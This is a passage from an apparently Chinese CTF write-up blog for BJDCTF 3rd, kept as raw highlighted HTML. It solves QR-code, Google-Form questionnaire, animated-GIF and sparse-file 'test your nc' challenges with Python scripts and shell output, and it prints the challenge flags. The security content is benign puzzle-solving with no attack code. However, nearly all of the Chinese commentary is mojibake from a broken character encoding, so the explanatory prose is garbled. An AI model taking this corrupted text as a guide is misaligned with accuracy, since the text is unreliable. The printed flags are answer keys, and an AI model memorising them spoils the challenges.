comment"># print(table)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'{}.txt'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>        row <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">while</span> row <span class="token operator">&lt;</span> <span class="token number">25</span><span class="token punctuation">:</span>            line <span class="token operator">=</span> fin<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> line<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>                    table<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>            row <span class="token operator">+=</span> <span class="token number">1</span>a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">255</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> row<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">]</span>qrcode <span class="token operator">=</span> Image<span class="token punctuation">.</span>fromarray<span class="token punctuation">(</span>np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>qrcode<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'qrcode.png'</span><span class="token punctuation">)</span></code></pre><p>è¿™é‡Œå›¾ç‰‡åè‰²äº†è¿˜æœ‰ç‚¹å°å•Šå“ˆå“ˆå“ˆã€‚é—®é¢˜ä¸å¤§ï¼Œæ”¾å¤§æ¥æ‰«å°±æ˜¯äº†ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/qrcode.png" alt="qrcode"></p><p>æ‰«ç å¾—åˆ°</p><p><code>BJD{TW1NKLE_TW1NKLE_L1TTLE_5TAR}</code></p><p>çœŸæ˜¯ä¸€é—ªä¸€é—ªäº®æ™¶æ™¶~</p><p>MD5 åå¾—åˆ°</p><p><code>e1eded5a7f630a2d02d3fe17b786919a</code></p><p>å“‡å¥½è€¶ï¼Œè¿™é¢˜å¥½éš¾å¾—å•Šï¼Œæ˜¯ 17 ä¸ªåšå‡ºæ¥çš„ä¹‹ä¸€å”‰ã€‚</p><br><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><blockquote><p> å®~ æ‚¨æœ‰ä¸€ä»½è°ƒæŸ¥é—®å·~ è¯·æŸ¥æ”¶~  <a href="https://forms.gle/Vmzt99LazrtXsRLM9">https://forms.gle/Vmzt99LazrtXsRLM9</a></p></blockquote><blockquote><p>flagæ ¼å¼ï¼š32ä½å­—ç¬¦ä¸²</p><p>å…³äºé—®å·é—®é¢˜ç­”æ¡ˆï¼šè¯·ä½¿ç”¨è‹±æ–‡æˆ–æ‹¼éŸ³ä½œç­”ã€‚</p><p>é—®å·ç¬¬ä¸ƒé¢˜hint</p><p>ç¦»ä¸­å›½ç§‘å­¦é™¢å¤§å­¦æœ€è¿‘çš„é•¿åŸ</p><p>ç­”æ¡ˆä¸ºé•¿åŸåå­—çš„æ‹¼éŸ³ï¼Œä¾‹å¦‚:</p><p>Badaling</p><p>ç­”å¯¹æ¯é¢˜éƒ½ä¼šæç¤ºflagçš„ä¸€éƒ¨åˆ†</p><p>Flagä¸€å…±7éƒ¨åˆ†</p><p>é™¤äº†å¤§å­¦å’Œå…¬å›­å¤–</p><p>å…¶ä½™é¢˜ç›®éƒ½æ˜¯æ‹¼éŸ³</p></blockquote><p>è¿™æ˜¯ä»€ä¹ˆç­¾åˆ°é¢˜ï¼Ÿï¼Ÿï¼Ÿ</p><p>æœ€å¼€å§‹ä»¥ä¸ºæ˜¯å¡«äº†ä¹‹åæ”¾flagçš„ï¼Œå‘ç°å¹¶ä¸æ˜¯ã€‚</p><p>å¡«äº†å‡ ä¸ªå‘ç°é”™è¯¯æç¤ºï¼Œå’Œ TaQini å¸ˆå‚… py äº†ä¸€ä¸‹ï¼Œæœç„¶æ˜¯ä¸€ä¸ªé¢˜ç»™ä¸€éƒ¨åˆ† flagï¼Œæœ€åè¿èµ·æ¥ã€‚ï¼ˆä¸è¿‡åˆ°æœ€åä¹Ÿæ”¾ hint äº†å“ˆå“ˆå“ˆ</p><p>å€ŸåŠ©ç™¾åº¦è¯†å›¾ã€æœç‹—è¯†å›¾ã€è°·æ­Œè¯†å›¾ï¼Œå¥½ä¸å®¹æ˜“æ‰æ•´æ˜ç™½æ˜¯å•¥ã€‚ã€‚ï¼ˆæ„Ÿè§‰æ‰¾ä¸ªè€åŒ—äº¬äººè¦å¿«å¾—å¤šå‘¢2333</p><p>å›¾ç‰‡åˆ†åˆ«å¯¹åº”ç€ï¼š</p><blockquote><p>BIT åŒ—ç†å·¥ d41d</p><p>å¥½é‚»å±… 8cd9</p><p>ç¨»é¦™æ‘ 8f00b2</p><p>jingweizhai 04e9</p><p>Jingshan Park æ™¯å±±å…¬å›­ 8009</p><p>chaoyang æœé˜³ 98ecf8</p><p>hefangkou æ²³é˜²å£ 427e </p></blockquote><p><em>ï¼ˆæœ€åè¿™ä¸ªé•¿åŸæŸ¥äº†åŠå¤©ï¼Œæœç´¢å¼•æ“å‘Šè¯‰æˆ‘æ€€æŸ”åŒºçš„é•¿åŸæ˜¯æ…•ç”°å³ªï¼ˆç¡®å®ï¼‰ã€‚ã€‚åæ¥å’Œ TaQini å¸ˆå‚…èŠåˆ°è¯´è¿™æ˜¯ä¸ªé²œä¸ºäººçŸ¥çš„é•¿åŸâ€¦â€¦</em></p><p>è¿èµ·æ¥å¾—åˆ° flagï¼š</p><p><code>d41d8cd98f00b204e9800998ecf8427e</code></p><p>P.S.: åé¢æŸ¥ä¸å‡ºæ¥åœ¨ç½‘é¡µé‡Œä¸€æœï¼Œå‘ç°è¿˜æ˜¯è°·æ­Œçš„å¥—è·¯ï¼Œæ˜¯ç”¨ JavaScript ä¼ å…¥çš„æ•°æ®ã€‚é‡Œé¢å°±æœ‰åŒ¹é…çš„é€»è¾‘äº†ã€‚</p><p>ï¼ˆè¿˜æ˜¯ F12 å¤§æ³•å¥½å‘€ï¼</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522231643959.png" alt="js"></p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token constant">FB_PUBLIC_LOAD_DATA_</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Let's see how well you know our Capital."</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1790362738</span><span class="token punctuation">,</span><span class="token string">"What is the name of this university?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">336510603</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Beijing Institute of Technology|BIT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"d41d"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">416</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">603160739</span><span class="token punctuation">,</span><span class="token string">"What is the name of the store?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">539054317</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Haolinju|haolinju"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8cd9"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">416</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">488094967</span><span class="token punctuation">,</span><span class="token string">" What BRAND is this food?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1465781074</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Daoxiangcun|daoxiangcun"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8f00b2"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">375</span><span class="token punctuation">,</span><span class="token number">458</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1097246628</span><span class="token punctuation">,</span><span class="token string">"Which RESTAURANT are the ducks coming from? "</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">353762320</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Jingweizhai|jingweizhai"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"04e9"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">555</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1916058196</span><span class="token punctuation">,</span><span class="token string">"Which PARK is this?"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">901636349</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Jingshan|jingshan"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"8009"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">554</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1044111735</span><span class="token punctuation">,</span><span class="token string">"Which DISTRICT is the No.3 of Beijing?"</span><span class="token punctuation">,</span><span class="token string">"The restaurant in question4 is in this Distric"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1620980704</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Chaoyang|chaoyang"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"98ecf8"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">740</span><span class="token punctuation">,</span><span class="token number">371</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1877231084</span><span class="token punctuation">,</span><span class="token string">"Which part of the Great Wall is this?"</span><span class="token punctuation">,</span><span class="token string">"In Huairou Distric"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1337434564</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"Hefangkou|hefangkou"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"427e"</span><span class="token punctuation">]</span> <span class="token comment">//...</span></code></pre><br><hr><h3 id="bin-cat-2"><a href="#bin-cat-2" class="headerlink" title="/bin/cat 2"></a>/bin/cat 2</h3><blockquote><p>[CAUTION] cats as numerous as stars are comingâ€¦ è§£å‡ºçš„ç­”æ¡ˆç»md5åæäº¤~</p></blockquote><p><img src="/2020/05/24/CTF_BJDCTF3rd/2005205ec4f1a07a3e9.gif" alt="2005205ec4f1a07a3e9"></p><p>æœ‰ä¸¤ç§å–µå–µï¼Œè¿˜æ˜¯åŠ¨å›¾å”‰ï¼Œè¿œç€çœ‹å°±æ˜¯äºŒç»´ç å˜›ï¼<em>ï¼ˆæœç„¶æ˜¯ TaQini å¸ˆå‚…å‡ºçš„é¢˜</em></p><p>é¦–å…ˆæŠŠå®½åº¦å‹ç¼©åˆ°åŸæ¥ä¸€åŠï¼Œæœ¬æ¥æƒ³ python å†™ä¸ªjioæœ¬çš„ï¼ŒPIL æ„Ÿè§‰æœ‰ç‚¹éº»çƒ¦è¿˜ä¸å¤§ä¼šã€‚</p><p>äºæ˜¯ä¸€æ³¢éªšæ“ä½œé‡æ–°ä¸Šä¸ªè‰²å¥½äº†ã€‚ï¼ˆä½ è‚¯å®šæƒ³ä¸åˆ°æˆ‘æ˜¯åœ¨ word ä¸­å¤„ç†çš„å§ï¼Œå˜¿å˜¿å˜¿</p><p>PS ä¹Ÿè¡Œï¼ŒStegsolve é‡Œ gif æˆªå–ä¸€å¸§ç„¶åä¸¢å»å–æŸé€šé“æŸ bit ä¿¡æ¯/éšæœºä¸Šè‰²/etc. éƒ½è¡Œã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200522212913109.png" alt="é‡æ–°ä¸Šè‰²"></p><p>æ‰«ç å¾—åˆ°</p><p><code>m1ao~miao~mi@o~Mia0~m!aO~m1a0~~~</code></p><p>å–µå–µå–µå–µå–µå–µ~</p><p>md5åŠ å¯†å¾—åˆ°32ä½flagã€‚</p><p><code>9b84eb9e7107ffafebeb1000e8c05322</code></p><p><em>ï¼ˆçœ‹åˆ°è¿˜çœŸæœ‰æ‰‹æ“äºŒç»´ç çš„ tql</em></p><br><hr><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test your nc"></a>test your nc</h3><blockquote><p> 183.129.189.60:10118,10119,10120,10121,10122,10123</p></blockquote><blockquote><p>hint1: /f1a9.bak ä½ çœ‹åˆ°äº†å˜›? </p><p>hint2: ç”¨dfå‘½ä»¤çœ‹çœ‹ç¡¬ç›˜æ€»å…±å¤šå¤§ï¼Œå†çœ‹çœ‹flagå¤šå¤§ã€‚</p><p>hint3: ç³»ç»Ÿå‘½ä»¤ä¸å¤Ÿä½¿ï¼Ÿè¯•è¯•ä¸‡èƒ½çš„python</p></blockquote><p>å…ˆæ¥çœ‹çœ‹ <code>/f1a9.bak</code>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /f1a9.bak<span class="token comment">#!/usr/bin/python</span><span class="token comment">#coding=utf-8</span>from random <span class="token function">import</span> randintfrom uuid <span class="token function">import</span> uuid4flag <span class="token operator">=</span> <span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span>:-1<span class="token punctuation">]</span> <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span>.fields<span class="token punctuation">]</span><span class="token assign-left variable">f</span><span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'/home/ctf/flag'</span>,<span class="token string">'w'</span><span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'ğŸ€'</span><span class="token punctuation">)</span>f.seek<span class="token punctuation">(</span><span class="token number">1024</span>*1024*1024<span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'flag{'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">1024</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> flag:    f.seek<span class="token punctuation">(</span><span class="token number">1024</span>*1024*1024*randint<span class="token punctuation">(</span>offset,offset+2048<span class="token punctuation">))</span>    offset <span class="token operator">+=</span> <span class="token number">2048</span>    f.write<span class="token punctuation">(</span>i<span class="token punctuation">)</span>f.write<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>f.seek<span class="token punctuation">(</span><span class="token number">1024</span>*1024*1024*randint<span class="token punctuation">(</span>offset,offset+2048<span class="token punctuation">))</span>f.write<span class="token punctuation">(</span><span class="token string">'good job!'</span><span class="token punctuation">)</span>f.close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿™é‡Œçš„<code>uuid</code>æ­£å¥½å°±æŸ¥äº†ä¸€ä¸‹ã€‚</p><blockquote><p>UUID: é€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ ( Universally Unique Identifier ),  å¯¹äºæ‰€æœ‰çš„UUIDå®ƒå¯ä»¥ä¿è¯åœ¨ç©ºé—´å’Œæ—¶é—´ä¸Šçš„å”¯ä¸€æ€§. å®ƒæ˜¯é€šè¿‡MACåœ°å€, æ—¶é—´æˆ³, å‘½åç©ºé—´, éšæœºæ•°,  ä¼ªéšæœºæ•°æ¥ä¿è¯ç”ŸæˆIDçš„å”¯ä¸€æ€§, æœ‰ç€å›ºå®šçš„å¤§å°( 128 bit ).  å®ƒçš„å”¯ä¸€æ€§å’Œä¸€è‡´æ€§ç‰¹ç‚¹ä½¿å¾—å¯ä»¥æ— éœ€æ³¨å†Œè¿‡ç¨‹å°±èƒ½å¤Ÿäº§ç”Ÿä¸€ä¸ªæ–°çš„UUID. UUIDå¯ä»¥è¢«ç”¨ä½œå¤šç§ç”¨é€”, æ—¢å¯ä»¥ç”¨æ¥çŸ­æ—¶é—´å†…æ ‡è®°ä¸€ä¸ªå¯¹è±¡,  ä¹Ÿå¯ä»¥å¯é çš„è¾¨åˆ«ç½‘ç»œä¸­çš„æŒä¹…æ€§å¯¹è±¡.</p></blockquote><blockquote><p>python çš„ uuid æ¨¡å—æä¾›UUIDç±»å’Œå‡½æ•°uuid1(), uuid3(), uuid4(), uuid5() æ¥ç”Ÿæˆ1, 3,  4, 5å„ä¸ªç‰ˆæœ¬çš„UUID ( éœ€è¦æ³¨æ„çš„æ˜¯: pythonä¸­æ²¡æœ‰uuid2()è¿™ä¸ªå‡½æ•°). å¯¹uuidæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡ ä¸ªå‡½æ•°æ€»ç»“å¦‚ä¸‹: </p><ol><li><p>uuid.uuid1([node[, clock_seq]]) : åŸºäºæ—¶é—´æˆ³</p><p>ä½¿ç”¨ä¸»æœºID, åºåˆ—å·, å’Œå½“å‰æ—¶é—´æ¥ç”ŸæˆUUID, å¯ä¿è¯å…¨çƒèŒƒå›´çš„å”¯ä¸€æ€§. ä½†ç”±äºä½¿ç”¨è¯¥æ–¹æ³•ç”Ÿæˆçš„UUIDä¸­åŒ…å«æœ‰ä¸»æœºçš„ç½‘ç»œåœ°å€, å› æ­¤å¯èƒ½å±åŠéšç§. è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°, å¦‚æœ node å‚æ•°æœªæŒ‡å®š, ç³»ç»Ÿå°†ä¼šè‡ªåŠ¨è°ƒç”¨ getnode() å‡½æ•°æ¥è·å–ä¸»æœºçš„ç¡¬ä»¶åœ°å€.  å¦‚æœ clock_seq  å‚æ•°æœªæŒ‡å®šç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªéšæœºäº§ç”Ÿçš„14ä½åºåˆ—å·æ¥ä»£æ›¿. </p></li><li><p>uuid.uuid3(namespace, name) : åŸºäºåå­—çš„MD5æ•£åˆ—å€¼</p><p>é€šè¿‡è®¡ç®—å‘½åç©ºé—´å’Œåå­—çš„MD5æ•£åˆ—å€¼æ¥ç”ŸæˆUUID, å¯ä»¥ä¿è¯åŒä¸€å‘½åç©ºé—´ä¸­ä¸åŒåå­—çš„å”¯ä¸€æ€§å’Œä¸åŒå‘½åç©ºé—´çš„å”¯ä¸€æ€§, ä½†åŒä¸€å‘½åç©ºé—´çš„åŒä¸€åå­—ç”Ÿæˆçš„UUIDç›¸åŒ.</p></li><li><p>uuid.uuid4() : åŸºäºéšæœºæ•°</p><p>é€šè¿‡éšæœºæ•°æ¥ç”ŸæˆUUID. ä½¿ç”¨çš„æ˜¯ä¼ªéšæœºæ•°æœ‰ä¸€å®šçš„é‡å¤æ¦‚ç‡. </p></li><li><p>uuid.uuid5(namespace, name) : åŸºäºåå­—çš„SHA-1æ•£åˆ—å€¼</p><p>é€šè¿‡è®¡ç®—å‘½åç©ºé—´å’Œåå­—çš„SHA-1æ•£åˆ—å€¼æ¥ç”ŸæˆUUID, ç®—æ³•ä¸ uuid.uuid3() ç›¸åŒ.</p></li></ol><p>ï¼ˆæ¥è‡ªç½‘ç»œï¼‰</p></blockquote><p>çœ‹æ¥æ˜¯åœ¨ <code>1024*1024*1024*randint(offset,offset+2048)</code> çš„éšæœºä½ç½®å†™å…¥äº†flagã€‚</p><p>å†æ¥çœ‹çœ‹ç¡¬ç›˜å¤§å°å’Œæ–‡ä»¶å¤§å°ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">df</span>Filesystem     1K-blocks    Used Available Use% Mounted onoverlay         <span class="token number">16197544</span> <span class="token number">2011556</span>  <span class="token number">14169604</span>  <span class="token number">13</span>% /tmpfs              <span class="token number">65536</span>       <span class="token number">0</span>     <span class="token number">65536</span>   <span class="token number">0</span>% /devtmpfs             <span class="token number">507956</span>       <span class="token number">0</span>    <span class="token number">507956</span>   <span class="token number">0</span>% /sys/fs/cgroup/dev/vda1       <span class="token number">16197544</span> <span class="token number">2011556</span>  <span class="token number">14169604</span>  <span class="token number">13</span>% /etc/hostsshm                <span class="token number">65536</span>       <span class="token number">0</span>     <span class="token number">65536</span>   <span class="token number">0</span>% /dev/shmtmpfs             <span class="token number">507956</span>       <span class="token number">0</span>    <span class="token number">507956</span>   <span class="token number">0</span>% /proc/acpitmpfs             <span class="token number">507956</span>       <span class="token number">0</span>    <span class="token number">507956</span>   <span class="token number">0</span>% /proc/scsitmpfs             <span class="token number">507956</span>       <span class="token number">0</span>    <span class="token number">507956</span>   <span class="token number">0</span>% /sys/firmware$ <span class="token function">ls</span> -altotal <span class="token number">64</span>drwxr-x--- <span class="token number">1</span> root ctf            <span class="token number">4096</span> May <span class="token number">22</span> 06:40 <span class="token builtin class-name">.</span>drwxr-xr-x <span class="token number">1</span> root root           <span class="token number">4096</span> May <span class="token number">19</span> 03:09 <span class="token punctuation">..</span>-rwxr-x--- <span class="token number">1</span> root ctf             <span class="token number">220</span> May  <span class="token number">5</span>  <span class="token number">2019</span> .bash_logout-rwxr-x--- <span class="token number">1</span> root ctf            <span class="token number">3771</span> May  <span class="token number">5</span>  <span class="token number">2019</span> .bashrc-rwxr-x--- <span class="token number">1</span> root ctf             <span class="token number">807</span> May  <span class="token number">5</span>  <span class="token number">2019</span> .profile-rw-r----- <span class="token number">1</span> root ctf  <span class="token number">16150150774793</span> May <span class="token 